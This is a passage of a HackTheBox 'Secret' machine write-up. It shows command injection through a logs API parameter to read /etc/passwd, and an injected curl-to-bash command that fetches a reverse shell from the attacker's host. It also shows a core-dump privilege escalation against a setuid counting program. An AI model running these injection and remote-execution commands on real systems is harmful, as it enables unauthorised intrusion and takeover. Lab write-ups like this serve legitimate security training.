            res.json<span class="o">(</span>output<span class="o">)</span><span class="p">;</span>
        <span class="o">})</span>
    <span class="o">}</span>
    <span class="k">else</span><span class="o">{</span>
        res.json<span class="o">({</span>
            role: <span class="o">{</span>
                role: <span class="s2">"you are normal user"</span>,
                desc: userinfo.name.name
            <span class="o">}</span>
        <span class="o">})</span>
    <span class="o">}</span>
<span class="o">})</span>

router.use<span class="o">(</span><span class="k">function</span> <span class="o">(</span>req, res, next<span class="o">)</span> <span class="o">{</span>
    res.json<span class="o">({</span>
        message: <span class="o">{</span>

            message: <span class="s2">"404 page not found"</span>,
            desc: <span class="s2">"page you are looking for is not found. "</span>
        <span class="o">}</span>
    <span class="o">})</span>
<span class="o">})</span><span class="p">;</span>

module.exports <span class="o">=</span> router
</pre></table></code></div></div><p>Guess not all commit show another have of this private.js code. As for the code it use the get method with <code class="language-plaintext highlighter-rouge">/logs</code> and the code with <code class="language-plaintext highlighter-rouge">req.query.file</code> think will be parameter for the logs get method.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="c">#get rce </span>
root@Rav3nCLaW <span class="o">[</span>11:31:55 AM] <span class="o">[</span>~/Documents/htb/secret] 
-&gt; <span class="c"># curl http://10.10.11.120/api/logs\?file\=\;cat+/etc/passwd -H 'auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWJmZWZlOGQ3YTU3MTA0NjE1NTUyNWMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFkbWluQGRhc2l0aC53b3JrcyIsImlhdCI6MTYzOTk2OTAwNX0.J98EPAjVQ7KJwK2i0OC9BQ2CSqav7I3T6Tq0dyZ_YT0'</span>
<span class="s2">"80bf34c fixed typos 🎉</span><span class="se">\n</span><span class="s2">0c75212 now we can view logs from server 😃</span><span class="se">\n</span><span class="s2">ab3e953 Added the codes</span><span class="se">\n</span><span class="s2">root:x:0:0:root:/root:/bin/bash</span><span class="se">\n</span><span class="s2">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><span class="se">\n</span><span class="s2">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><span class="se">\n</span><span class="s2">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><span class="se">\n</span><span class="s2">sync:x:4:65534:sync:/bin:/bin/sync</span><span class="se">\n</span><span class="s2">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><span class="se">\n</span><span class="s2">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><span class="se">\n</span><span class="s2">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><span class="se">\n</span><span class="s2">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><span class="se">\n</span><span class="s2">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><span class="se">\n</span><span class="s2">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><span class="se">\n</span><span class="s2">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><span class="se">\n</span><span class="s2">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><span class="se">\n</span><span class="s2">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><span class="se">\n</span><span class="s2">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><span class="se">\n</span><span class="s2">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><span class="se">\n</span><span class="s2">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><span class="se">\n</span><span class="s2">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><span class="se">\n</span><span class="s2">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><span class="se">\n</span><span class="s2">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><span class="se">\n</span><span class="s2">systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><span class="se">\n</span><span class="s2">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin</span><span class="se">\n</span><span class="s2">syslog:x:104:110::/home/syslog:/usr/sbin/nologin</span><span class="se">\n</span><span class="s2">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin</span><span class="se">\n</span><span class="s2">tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false</span><span class="se">\n</span><span class="s2">uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin</span><span class="se">\n</span><span class="s2">tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin</span><span class="se">\n</span><span class="s2">landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin</span><span class="se">\n</span><span class="s2">pollinate:x:110:1::/var/cache/pollinate:/bin/false</span><span class="se">\n</span><span class="s2">usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><span class="se">\n</span><span class="s2">sshd:x:112:65534::/run/sshd:/usr/sbin/nologin</span><span class="se">\n</span><span class="s2">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><span class="se">\n</span><span class="s2">dasith:x:1000:1000:dasith:/home/dasith:/bin/bash</span><span class="se">\n</span><span class="s2">lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false</span><span class="se">\n</span><span class="s2">mongodb:x:113:117::/var/lib/mongodb:/usr/sbin/nologin</span><span class="se">\n</span><span class="s2">
</span></pre></table></code></div></div><p>Now we can get the reverse shell and we can get it with our own bash reverse shell where we curl our file to the machine and execute it.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>root@Rav3nCLaW <span class="o">[</span>11:49:57 PM] <span class="o">[</span>~/Documents/htb/secret] 
-&gt; <span class="c"># curl http://10.10.11.120/api/logs\?file\=\|curl%20http://10.10.14.84:8000/revshell.sh%20%7C%20bash -H 'auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWMwYTRiZTRhZmVhODA0M2VlMDEzNjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFkbWluQGRhc2l0aC53b3JrcyIsImlhdCI6MTY0MDAxNTA1OH0.FL2H-2FwHFWTa1gz9PRrYWRrgKk1QlOIJM1kwWj29Q0'</span>
</pre></table></code></div></div><p><img data-src="/assets/img/secret/Untitled%205.png" alt="Untitled" data-proofer-ignore></p><h2 id="privilage-escalation"><span class="mr-2"><strong>Privilage escalation</strong></span><a href="#privilage-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The root privesc is not easy and I run the linpeas to check the possible outcome to privesc.</p><p>Found c program in /opt directory then in the code there is a function that can be use to get the code dump of the program.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;dirent.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/prctl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/limits.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">dircount</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">summary</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">DIR</span> <span class="o">*</span><span class="n">dir</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">fullpath</span><span class="p">[</span><span class="n">PATH_MAX</span><span class="p">];</span>
    <span class="k">struct</span> <span class="n">dirent</span> <span class="o">*</span><span class="n">ent</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">stat</span> <span class="n">fstat</span><span class="p">;</span>

    <span class="kt">int</span> <span class="n">tot</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">regular_files</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">directories</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">symlinks</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">if</span><span class="p">((</span><span class="n">dir</span> <span class="o">=</span> <span class="n">opendir</span><span class="p">(</span><span class="n">path</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Unable to open directory.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">while</span> <span class="p">((</span><span class="n">ent</span> <span class="o">=</span> <span class="n">readdir</span><span class="p">(</span><span class="n">dir</span><span class="p">))</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="o">++</span><span class="n">tot</span><span class="p">;</span>
        <span class="n">strncpy</span><span class="p">(</span><span class="n">fullpath</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">PATH_MAX</span><span class="o">-</span><span class="n">NAME_MAX</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
        <span class="n">strcat</span><span class="p">(</span><span class="n">fullpath</span><span class="p">,</span> <span class="s">"/"</span><span class="p">);</span>
        <span class="n">strncat</span><span class="p">(</span><span class="n">fullpath</span><span class="p">,</span> <span class="n">ent</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">ent</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">));</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">lstat</span><span class="p">(</span><span class="n">fullpath</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fstat</span><span class="p">))</span>
        <span class="p">{</span>
            <span class="k">if</span><span class="p">(</span><span class="n">S_ISDIR</span><span class="p">(</span><span class="n">fstat</span><span class="p">.</span><span class="n">st_mode</span><span class="p">))</span>
            <span class="p">{</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"d"</span><span class="p">);</span>
                <span class="o">++</span><span class="n">directories</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">S_ISLNK</span><span class="p">(</span><span class="n">fstat</span><span class="p">.</span><span class="n">st_mode</span><span class="p">))</span>
            <span class="p">{</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"l"</span><span class="p">);</span>
                <span class="o">++</span><span class="n">symlinks</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">S_ISREG</span><span class="p">(</span><span class="n">fstat</span><span class="p">.</span><span class="n">st_mode</span><span class="p">))</span>
            <span class="p">{</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"-"</span><span class="p">);</span>
                <span class="o">++</span><span class="n">regular_files</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">else</span> <span class="n">printf</span><span class="p">(</span><span class="s">"?"</span><span class="p">);</span>
            <span class="n">printf</span><span class="p">((</span><span class="n">fstat</span><span class="p">.</span><span class="n">st_mode</span> <span class="o">&amp;</span> <span class="n">S_IRUSR</span><span class="p">)</span> <span class="o">?</span> <span class="s">"r"</span> <span class="o">:</span> <span class="s">"-"</span><span class="p">);</span>
            <span class="n">printf</span><span class="p">((</span><span class="n">fstat</span><span class="p">.</span><span class="n">st_mode</span> <span class="o">&amp;</span> <span class="n">S_IWUSR</span><span class="p">)</span> <span class="o">?</span> <span class="s">"w"</span> <span class="o">:</span> <span class="s">"-"</span><span class="p">);</span>
            <span class="n">printf</span><span class="p">((</span><span class="n">fstat</span><span class="p">.</span><span class="n">st_mode</span> <span class="o">&amp;</span> <span class="n">S_IXUSR</span><span class="p">)</span> <span class="o">?</span> <span class="s">"x"</span> <span class="o">:</span> <span class="s">"-"</span><span class="p">);</span>
            <span class="n">printf</span><span class="p">((</span><span class="n">fstat</span><span class="p">.</span><span class="n">st_mode</span> <span class="o">&amp;</span> <span class="n">S_IRGRP</span><span class="p">)</span> <span class="o">?</span> <span class="s">"r"</span> <span class="o">:</span> <span class="s">"-"</span><span class="p">);</span>
            <span class="n">printf</span><span class="p">((</span><span class="n">fstat</span><span class="p">.</span><span class="n">st_mode</span> <span class="o">&amp;</span> <span class="n">S_IWGRP</span><span class="p">)</span> <span class="o">?</span> <span class="s">"w"</span> <span class="o">:</span> <span class="s">"-"</span><span class="p">);</span>
            <span class="n">printf</span><span class="p">((</span><span class="n">fstat</span><span class="p">.</span><span class="n">st_mode</span> <span class="o">&amp;</span> <span class="n">S_IXGRP</span><span class="p">)</span> <span class="o">?</span> <span class="s">"x"</span> <span class="o">:</span> <span class="s">"-"</span><span class="p">);</span>
            <span class="n">printf</span><span class="p">((</span><span class="n">fstat</span><span class="p">.</span><span class="n">st_mode</span> <span class="o">&amp;</span> <span class="n">S_IROTH</span><span class="p">)</span> <span class="o">?</span> <span class="s">"r"</span> <span class="o">:</span> <span class="s">"-"</span><span class="p">);</span>
            <span class="n">printf</span><span class="p">((</span><span class="n">fstat</span><span class="p">.</span><span class="n">st_mode</span> <span class="o">&amp;</span> <span class="n">S_IWOTH</span><span class="p">)</span> <span class="o">?</span> <span class="s">"w"</span> <span class="o">:</span> <span class="s">"-"</span><span class="p">);</span>
            <span class="n">printf</span><span class="p">((</span><span class="n">fstat</span><span class="p">.</span><span class="n">st_mode</span> <span class="o">&amp;</span> <span class="n">S_IXOTH</span><span class="p">)</span> <span class="o">?</span> <span class="s">"x"</span> <span class="o">:</span> <span class="s">"-"</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">else</span>
        <span class="p">{</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"??????????"</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="n">printf</span> <span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ent</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">closedir</span><span class="p">(</span><span class="n">dir</span><span class="p">);</span>

    <span class="n">snprintf</span><span class="p">(</span><span class="n">summary</span><span class="p">,</span> <span class="mi">4096</span><span class="p">,</span> <span class="s">"Total entries       = %d</span><span class="se">\n</span><span class="s">Regular files       = %d</span><span class="se">\n</span><span class="s">Directories         = %d</span><span class="se">\n</span><span class="s">Symbolic links      = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">tot</span><span class="p">,</span> <span class="n">regular_files</span><span class="p">,</span> <span class="n">directories</span><span class="p">,</span> <span class="n">symlinks</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">%s"</span><span class="p">,</span> <span class="n">summary</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">filecount</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">summary</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">FILE</span> <span class="o">*</span><span class="n">file</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">ch</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">characters</span><span class="p">,</span> <span class="n">words</span><span class="p">,</span> <span class="n">lines</span><span class="p">;</span>

    <span class="n">file</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">file</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Unable to open file.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Please check if file exists and you have read privilege.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">characters</span> <span class="o">=</span> <span class="n">words</span> <span class="o">=</span> <span class="n">lines</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">((</span><span class="n">ch</span> <span class="o">=</span> <span class="n">fgetc</span><span class="p">(</span><span class="n">file</span><span class="p">))</span> <span class="o">!=</span> <span class="n">EOF</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">characters</span><span class="o">++</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">ch</span> <span class="o">==</span> <span class="sc">'\n'</span> <span class="o">||</span> <span class="n">ch</span> <span class="o">==</span> <span class="sc">'\0'</span><span class="p">)</span>
            <span class="n">lines</span><span class="o">++</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">ch</span> <span class="o">==</span> <span class="sc">' '</span> <span class="o">||</span> <span class="n">ch</span> <span class="o">==</span> <span class="sc">'\t'</span> <span class="o">||</span> <span class="n">ch</span> <span class="o">==</span> <span class="sc">'\n'</span> <span class="o">||</span> <span class="n">ch</span> <span class="o">==</span> <span class="sc">'\0'</span><span class="p">)</span>
            <span class="n">words</span><span class="o">++</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">characters</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">words</span><span class="o">++</span><span class="p">;</span>
        <span class="n">lines</span><span class="o">++</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">snprintf</span><span class="p">(</span><span class="n">summary</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="s">"Total characters = %d</span><span class="se">\n</span><span class="s">Total words      = %d</span><span class="se">\n</span><span class="s">Total lines      = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">characters</span><span class="p">,</span> <span class="n">words</span><span class="p">,</span> <span class="n">lines</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">%s"</span><span class="p">,</span> <span class="n">summary</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">path</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
    <span class="kt">int</span> <span class="n">res</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">stat</span> <span class="n">path_s</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">summary</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"Enter source file/directory name: "</span><span class="p">);</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">"%99s"</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span>
    <span class="n">getchar</span><span class="p">();</span>
    <span class="n">stat</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">path_s</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">S_ISDIR</span><span class="p">(</span><span class="n">path_s</span><span class="p">.</span><span class="n">st_mode</span><span class="p">))</span>
        <span class="n">dircount</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">summary</span><span class="p">);</span>
    <span class="k">else</span>
        <span class="n">filecount</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">summary</span><span class="p">);</span>

    <span class="c1">// drop privs to limit file write</span>
    <span class="n">setuid</span><span class="p">(</span><span class="n">getuid</span><span class="p">());</span>
    <span class="c1">// Enable coredump generation</span>
    <span class="n">prctl</span><span class="p">(</span><span class="n">PR_SET_DUMPABLE</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> <span class="o">&lt;&lt;&lt;&lt;</span> 
    <span class="n">printf</span><span class="p">(</span><span class="s">"Save results a file? [y/N]: "</span><span class="p">);</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">==</span> <span class="mi">121</span> <span class="o">||</span> <span class="n">res</span> <span class="o">==</span> <span class="mi">89</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Path: "</span><span class="p">);</span>
        <span class="n">scanf</span><span class="p">(</span><span class="s">"%99s"</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span>
        <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">"a"</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">fputs</span><span class="p">(</span><span class="n">summary</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
            <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"Could not open %s for writing</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</pre></table></code></div></div><p>Meaning of the function <a href="https://www.tutorialspoint.com/unix_system_calls/prctl.htm">https://www.tutorialspoint.com/unix_system_calls/prctl.htm</a></p><p><img data-src="/assets/img/secret/Untitled%206.png" alt="Untitled" data-proofer-ignore></p><p>The idea is to make the program crash and the program will return the core dump in <code class="language-plaintext highlighter-rouge">/var/crash</code> The idea to crash it because the file of the cannot be write and since the function of pcrtl got in the code maybe it is the way.</p><p><a href="https://unix.stackexchange.com/questions/139071/what-are-the-files-located-in-var-crash">https://unix.stackexchange.com/questions/139071/what-are-the-files-located-in-var-crash</a></p><p><a href="https://wiki.ubuntu.com/CrashReporting">https://wiki.ubuntu.com/CrashReporting</a></p><p><img data-src="/assets/img/secret/Untitled%207.png" alt="Untitled" data-proofer-ignore></p><p>Run the count program and check the PID of the program to make it crash</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">kill</span> <span class="nt">-SEGV</span> 45739
</pre></table></code></div></div><p><img data-src="/assets/img/secret/Untitled%208.png" alt="Untitled" data-proofer-ignore></p><p>After kill the process we know that crash dump at the kernel will be at the <code class="language-plaintext highlighter-rouge">/var/crash</code> . Then use the apport-unpack to extract the core dump.</p><p><img data-src="/assets/img/secret/Untitled%209.png" alt="Untitled" data-proofer-ignore></p><p><img data-src="/assets/img/secret/Untitled%2010.png" alt="Untitled" data-proofer-ignore></p><p>Get the flag and submit it.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a>, <a href='/categories/writeup/'>writeup</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/git/" class="post-tag no-text-decoration" >.git</a> <a href="/tags/jwt-token/" class="post-tag no-text-decoration" >JWT token</a> <a href="/tags/source-code-review/" class="post-tag no-text-decoration" >source code review</a> <a href="/tags/core-dump/" class="post-tag no-text-decoration" >core dump</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Secret+Hackthebox+-+~%2F0xzim&url=https%3A%2F%2Fhazimsyah19.github.io%2Fposts%2FSecret-Hackthebox%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Secret+Hackthebox+-+~%2F0xzim&u=https%3A%2F%2Fhazimsyah19.github.io%2Fposts%2FSecret-Hackthebox%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fhazimsyah19.github.io%2Fposts%2FSecret-Hackthebox%2F&text=Secret+Hackthebox+-+~%2F0xzim" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Editorial-Hackthebox/">Editorial Hackthebox</a><li><a href="/posts/Bolt-Hackthebox/">Bolt Hackthebox</a><li><a href="/posts/Secret-Hackthebox/">Secret Hackthebox</a><li><a href="/posts/Backdoor-Hackthebox/">Backdoor Hackthebox</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/screen/">screen</a> <a class="post-tag" href="/tags/scripting/">scripting</a> <a class="post-tag" href="/tags/git/">.git</a> <a class="post-tag" href="/tags/core-dump/">core dump</a> <a class="post-tag" href="/tags/crack/">crack</a> <a class="post-tag" href="/tags/gdbserver/">gdbserver</a> <a class="post-tag" href="/tags/gitpython/">Gitpython</a> <a class="post-tag" href="/tags/jwt-token/">JWT token</a> <a class="post-tag" href="/tags/local-file-inclusion/">local file inclusion</a> <a class="post-tag" href="/tags/meterpreter/">meterpreter</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Bolt-Hackthebox/"><div class="card-body"> <em class="small" data-ts="1633881600" data-df="ll" > Oct 11, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Bolt Hackthebox</h3><div class="text-muted small"><p> Bolt Bolt is a medium machine on Hackthebox. Start with an archive that we need to download and in the archive got credentials that we need to crack. Vhost is found and we can log in with the cre...</p></div></div></a></div><div class="card"> <a href="/posts/Backdoor-Hackthebox/"><div class="card-body"> <em class="small" data-ts="1639792800" data-df="ll" > Dec 18, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Backdoor Hackthebox</h3><div class="text-muted small"><p> Backdoor Backdoor is an easy machine from Hackthebox. We start from finding wordpress website then have a vulnerable plugins. The plugins is vulnerable to directory traversal and it allows local...</p></div></div></a></div><div class="card"> <a href="/posts/Editorial-Hackthebox/"><div class="card-body"> <em class="small" data-ts="1720800000" data-df="ll" > Jul 13, 2024 </em><h3 class="pt-0 